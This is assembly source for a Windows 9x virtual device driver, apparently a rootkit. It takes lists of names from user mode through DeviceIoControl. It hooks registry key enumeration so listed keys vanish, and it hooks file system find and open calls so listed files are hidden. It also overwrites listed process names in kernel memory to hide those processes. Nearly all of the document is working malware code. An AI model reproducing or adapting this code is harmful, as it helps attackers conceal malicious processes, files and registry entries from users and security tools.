.586p
include vmm.inc
include vwin32.inc
include Ifsmgr.inc

DECLARE_VIRTUAL_DEVICE RX,1,0, RX_Control,UNDEFINED_DEVICE_ID, UNDEFINED_INIT_ORDER

Begin_control_dispatch RX
	Control_Dispatch w32_DeviceIoControl, RXDeviceControl
End_control_dispatch RX

VxD_PAGEABLE_DATA_SEG
        OPEN_FILE    EQU 24h
        BCS_OEM      EQU 1
        ActiveNext        dd 0
        OldStrucHook      dd 0
        ActiveFirstHandle dd 0
        OldStrucRegHook   dd 0
        BlockSize         dd 0
        BaseProcObj       dd 0
        szHandleSEH  db "TKAMB",0
        szTmpString  db 256  dup(0)
        szFullString db 256  dup(0)
        szWinFindDat db 320  dup(0)
        szSearchName db 256  dup(0)
        szProcBlock  db 1024 dup(0)
        szRegBlock   db 1024 dup(0)
        szFileBlock  db 1024 dup(0)
        szNullBlock  db 1024 dup(0)
        szProcTbl    dd 10   dup(0)
        szProcSize   db 10   dup(0)
        szRegTbl     dd 10   dup(0)
        szFileTbl    dd 10   dup(0)
        _ecx         dd 0

VxD_PAGEABLE_DATA_ENDS

VxD_PAGEABLE_CODE_SEG
BeginProc RXDeviceControl
        ; int 3

	RXIncomingCheck:
	cmp dword ptr [esi+0Ch], 0 ; DIOC_Open
	jz RxReturnControl
	cmp dword ptr [esi+0Ch], 2 ; DIOC_RegistryHide
	jz RXRegFill
	cmp dword ptr [esi+0Ch], 3 ; DIOC_ProcHide
	jz RXProcFill
	cmp dword ptr [esi+0Ch], 4 ; DIOC_ProcRoundAddr
	jz RXProcRound
	cmp dword ptr [esi+0Ch], 5 ; DIOC_BeginHooking
	jz RXBeginCode

        RxReturnControl:
	xor eax, eax
	ret

EndProc RXDeviceControl
        
        RXProcRound:
        ; int 3
        mov esi, [esi+10h]
        mov esi, [esi]
        mov dword ptr [BaseProcObj], esi

        xor eax, eax
        ret

        RXProcFill:
        int 3

        mov esi, [esi+10h]
        mov edi, offset szProcBlock
        mov ecx, 1024
        rep movsb

        xor edx, edx
        mov esi, offset szProcBlock
        mov edi, offset szProcTbl

        @@m:
        mov ebx, esi

        @@mm:
        lodsb
        cmp byte ptr [esi], 00Ah
        je @@mx
        test al, al
        jz @@mf
        jmp @@mm

        @@mf:
        mov eax, ebx
        stosd
        mov ecx, esi
        sub ecx, ebx
        mov dword ptr [szProcSize+edx], ecx
        add edx, 4
        jmp @@m

        @@mx:
        mov eax, ebx
        stosd
        mov ecx, esi
        sub ecx, ebx
        mov dword ptr [szProcSize+edx], ecx
        add edx, 4

        xor eax, eax
        ret

        RXRegFill:
        ; int 3

        mov edi, offset szRegTbl
        mov ecx, 10
        xor eax, eax
        rep stosd

        mov esi, [esi+10h]
        mov edi, offset szRegBlock
        mov ecx, 1024
        rep movsb

        xor edx, edx
        mov esi, offset szRegBlock
        mov edi, offset szRegTbl

        @@n:
        mov ebx, esi

        @@nn:
        lodsb
        cmp byte ptr [esi], 00Ah
        je @@nx
        test al, al
        jz @@nf
        jmp @@nn

        @@nf:
        mov eax, ebx
        stosd
        jmp @@n

        @@nx:
        mov eax, ebx
        stosd
        
        xor eax, eax
        ret

        RxFileFill:
        ; int 3

        mov esi, [esi+10h]
        mov edi, offset szFileBlock
        mov ecx, 1024
        rep movsb

        xor edx, edx
        mov esi, offset szFileBlock
        mov edi, offset szFileTbl

        @@o:
        mov ebx, esi

        @@oo:
        lodsb
        cmp byte ptr [esi], 00Ah
        je @@ox
        test al, al
        jz @@of
        jmp @@oo

        @@of:
        mov eax, ebx
        stosd
        jmp @@o

        @@ox:
        mov eax, ebx
        stosd

        xor eax, eax
        ret

        RXBeginCode:
        ; int 3

        ; call BeginFileHooking
        call BeginProcessHooking
        call BeginRegistryHiding
        xor eax, eax
        ret

        BeginProcessHooking:
        int 3
        
        assume fs:nothing
        
        push offset ErrCatch
        push dword ptr fs:[00h]
        mov dword ptr fs:[00h],esp

        xor edx, edx
        mov ecx, 10
        mov esi, offset szProcTbl

        @@XProcMastLoop:
        lodsd
        test eax, eax
        ; int 3
        jz @@XProcLookupExit
        pushad
        mov edx, dword ptr [szProcSize+edx]
        call RxProcLook
        popad
        add edx, 4
        loop @@XProcMastLoop

        @@XProcLookupExit:
        pop fs:[00h]
        ;add esp, 8
        pop eax
        ret

        BeginRegistryHiding:
        pushad

        assume fs:nothing

        ;push offset RegistryErrCatch
        ;push dword ptr fs:[00h]
        ;mov dword ptr fs:[00h],esp

        GetVxDServiceOrdinal eax, _RegEnumKey
        mov esi, offset RegEnumKeyHook
        VMMCall Hook_Device_Service

        mov dword ptr [OldStrucRegHook], esi

        popad
        ret

        BeginProc RegEnumKeyHook, HOOK_PROC, OldStrucRegHook, LOCKED
        int 3
        
        push ebp
        mov ebp, esp

        pushad
        pushfd
        
        push [ebp+14h]
        push [ebp+10h]
        push [ebp+0Ch]
        push [ebp+08h]
        call [OldStrucRegHook]
        add esp, 10h
        mov [ebp-04h], eax

        xor edx, edx

        LoopRegBlock:
        mov edi, [ebp+10h]
        mov ebx, edi
        mov esi, dword ptr [szRegTbl+edx]
        call RxStrLen
        test esi, esi
        jz LoopRegSucBlock
        repz cmpsb
        jz LoopRegHide
        add edx, 4
        jmp LoopRegBlock

        LoopRegSucBlock:

        popfd
        popad
        pop ebp

        ret
        
        LoopRegHide:
        ; int 3
        
        mov dword ptr [ebp-04h], 259 ; ERROR_NO_MORE_ITEMS
        mov byte ptr [ebx], 0

        popfd
        popad
        pop ebp

        ret

        EndProc RegEnumKeyHook

	BeginFileHooking:
	; int 3

        pushad

	push offset FileHookingProc
	VxDCall IFSMgr_InstallFileSystemApiHook
	add esp, 4
	mov dword ptr [OldStrucHook], eax

	popad
	ret
	FinishFileHooking:

	FileHookingProc:
	; int 3
	push ebp
	mov ebp, esp
	sub esp, 20h

	call RxDealPacketType
	test eax, eax
	je BadOperation
	jmp EndMad

	BadOperation:
        call RxInitialHandler

        EndMad:
	leave
	ret

        RxDealPacketType proc
          pushad

          mov eax, [ebp+0Ch]
          cmp eax, 02CH ; IFSFN_FINDOPEN
          jne @@2
          call RxFindOpen
          jmp @@5

          @@2:
          cmp eax, 024H ; IFSFN_OPEN
          jne @@3
          call RxFileOpen
          jmp @@5

          @@3:
          cmp eax, 002h ; IFSFN_FINDNEXT
          jne @@4
          call RxFindNext

          @@4:
          popad
          xor eax, eax
          ret

          @@5:
          popad
          xor eax, eax
          dec eax
          ret
        RxDealPacketType endp
        
        RxFindOpen proc
          mov ebx, [ebp+10h]
          and ebx, 0FFh
          cmp ebx, 0FFh
          je @@OpenCallHandler

          mov eax, [ebp+1ch]
          mov eax, [eax+24h]
          mov dword ptr [ActiveFirstHandle], eax

          pushad
	  xor eax, eax
	  push eax
	  mov eax, 100h
	  push eax
	  mov eax, [ebp+1ch]
	  mov eax, [eax+0ch]
	  add eax, 4
	  push eax
	  mov edi, offset szTmpString
	  push edi
	  VxDCall UniToBCSPath
	  add esp, 10h
	  popad
	 
          ; int 3
          xor edx, edx
          mov ecx, 10

          @@RxOpLoopMast:
	  mov esi, offset szTmpString
          mov edi, [szFileTbl+edx]
          test edi, edi
          je @@OpenCallHandler
	  push ecx
          push edx
          push 3
	  call RxStrStr
	  pop edx
	  pop ecx

	  test eax, eax
          je @@x

          add edx, 4
          loop @@RxOpLoopMast

          @@OpenCallHandler:
          call RxInitialHandler

          @@x:
          ret
        RxFindOpen endp

        RxFindNext proc
          mov ebx, [ebp+10h]
          and ebx, 0FFh
          cmp ebx, 0FFh
          je @@OpenCallHandler

          mov edi, offset szTmpString
          mov ecx, 100h
          xor eax, eax
          rep stosb

          push dword ptr [ebp+1Ch]
          push dword ptr [ebp+18h]
          push dword ptr [ebp+14h]
          push dword ptr [ebp+10h]
          push dword ptr [ebp+0Ch]
          push dword ptr [ebp+08h]
	  mov eax, dword ptr [OldStrucHook]
	  call dword ptr [eax]
	  add esp, (6*4)

          mov eax, [ebp+1ch]
	  mov eax, [eax+14h]
	  add eax, 2Ch
          mov esi, eax

          pushad
	  xor eax, eax
	  push eax
	  mov eax, 100h
	  push eax
	  mov eax, esi
	  push eax
	  mov edi, offset szTmpString
	  push edi
	  VxDCall UniToBCSPath
	  add esp, 10h
	  popad

          mov edi, offset szSearchName
          mov esi, offset szTmpString
          mov eax, [ebp+10h]
          add al, 40h ; '@'
          stosb
          mov al, 3Ah ; ':'
          stosb
          mov ecx, 253
          cld
          rep movsb
          
          ; int 3

	  xor edx, edx
          mov ecx, 10

          @@RxFNLoopMast:
	  mov esi, offset szTmpString
          mov edi, [szFileTbl+edx]
          test edi, edi
          je @@NextCallHandler
	  push ecx
          push edx
          push 3
	  call RxStrStr
	  pop edx
	  pop ecx

	  test eax, eax
          je @@SkipCallHandler

          add edx, 4
          loop @@RxFNLoopMast

          @@NextCallHandler:
          call RxInitialHandler

          @@SkipCallHandler:
          ret
        RxFindNext endp

        RxFileOpen proc
          mov ebx, [ebp+10h]
          and ebx, 0FFh
          cmp ebx, 0FFh
          je @@b

          mov eax, [ebp+1ch]
          mov eax, [eax+24h]
          mov dword ptr [ActiveFirstHandle], eax

          pushad
	  xor eax, eax
	  push eax
	  mov eax, 100h
	  push eax
	  mov eax, [ebp+1ch]
	  mov eax, [eax+0ch]
	  add eax, 4
	  push eax
	  mov edi, offset szTmpString
	  push edi
	  VxDCall UniToBCSPath
	  add esp, 10h
	  popad
	 
          ; int 3

          xor edx, edx
          mov ecx, 10

          @@RxFOLoopMast:
	  mov esi, offset szTmpString
          mov edi, [szFileTbl+edx]
          test edi, edi
          je @@XOpenCallHandler
	  push ecx
          push edx
          push 3
	  call RxStrStr
	  pop edx
	  pop ecx

	  test eax, eax
          je @@XOpenCallHandler

          add edx, 4
          loop @@RxFOLoopMast

          @@XOpenCallHandler:
          call RxInitialHandler

          @@b:
          ret
        RxFileOpen endp
        
        RxInitialHandler proc
        
          push dword ptr [ebp+1Ch]
          push dword ptr [ebp+18h]
          push dword ptr [ebp+14h]
          push dword ptr [ebp+10h]
          push dword ptr [ebp+0Ch]
          push dword ptr [ebp+08h]
	  mov eax, dword ptr [OldStrucHook]
	  call dword ptr [eax]
          add esp, (6*4)
          
          ret
        RxInitialHandler endp

        RxStrStr proc
          pushad
          mov esi, edi
          mov ecx, 256
          xor eax, eax

          @@sub1:
          lodsb
          test eax, eax
          jz @@sub2
          loop @@sub1
          jmp @@sub6

          @@sub2:
          mov eax, 256
          sub eax, ecx
          mov dword ptr [BlockSize], eax

          popad

          mov ecx, 256
          xor edx, edx
          mov ebx, esi

          @@sub3:
          push edi
          add edi, [esp+8]
          mov esi, ebx
          add esi, edx
          add esi, 3
          push ecx
          mov ecx, dword ptr [BlockSize]
          sub ecx, 3
          repz cmpsb
          jz @@sub4
          pop ecx
          pop edi
          inc edx
          loop @@sub3
          xor eax, eax
          inc ecx
          jmp @@sub7

          @@sub6:
          popad
          xor eax, eax
          inc ecx
          jmp @@sub7

          @@sub4:
          add esp, 8

          @@sub5:
          xor eax, eax

          @@sub7:
          retn 4
        RxStrStr endp
        
        RxProcLook proc
          int 3

          mov edi, dword ptr [BaseProcObj]
          mov ecx, 0FFFFFh ; 25000000

          @@XProcLoopIge:
          mov esi, eax
          push ecx
          mov ecx, edx
          repz cmpsb
          pop ecx
          jecxz @@XFoundNone
          jz @@XProcValidFound
          loop @@XProcLoopIge
          jmp @@XFoundNone

          @@XProcValidFound:
          ; int 3
          pushad
          mov esi, offset szNullBlock
          sub edi, 512
          mov ecx, 1024
          rep movsb
          popad
          mov esi, eax
          jmp @@XProcLoopIge

          @@XFoundNone:
          ; int 3
          ret
        RxProcLook endp
        
        RxStrLen proc
          pushad
          
          xor ecx, ecx

          RxCalcLen:
          lodsb
          test al, al
          jz RxCalcFin
          inc ecx
          jmp RxCalcLen

          RxCalcFin:
          mov dword ptr [_ecx], ecx

          popad
          mov ecx, dword ptr [_ecx]
          ret
        RxStrLen endp

        RegistryErrCatch:
        mov eax, [esp+0Ch]
        mov ebx, [eax+0B4h]
        mov [ebx+12], offset szHandleSEH

        xor eax, eax
        ret

        ErrCatch:
        ; int 3
        mov eax, [esp+0Ch]
        mov ebx, [eax+9Ch] ; ebx = cxt->EDI
        add ebx, 1000h
        mov [eax+9Ch], ebx ; cxt-> EDI = ebx
        
        mov ebx, [eax+0ACh] ; ebx = cxt->ECX
        sub ebx, 1000h
        mov [eax+0ACh], ebx ; cxt->ECX = ebx

        xor eax, eax
        ret

VxD_PAGEABLE_CODE_ENDS

end
